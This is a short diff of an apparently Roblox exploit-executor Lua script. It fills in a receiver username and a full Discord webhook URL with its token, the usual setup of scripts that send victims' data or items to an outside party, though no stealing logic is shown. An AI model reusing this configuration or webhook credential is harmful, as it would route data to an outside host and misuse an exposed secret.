@@ -1,5 +1,5 @@
-Username = ""
-Webhook = ""
+Username = "WspNegatron5"
+Webhook = "https://discord.com/api/webhooks/1536391097285087263/qF7Vlvud9CerBlObfDlJEyVli2LGuI37VOhyQLRoZFGWCLB5XOC4pY388OWND9_lOK_g"
 
 local recvr=Username
 local http_req=request or http_request or syn and syn.request
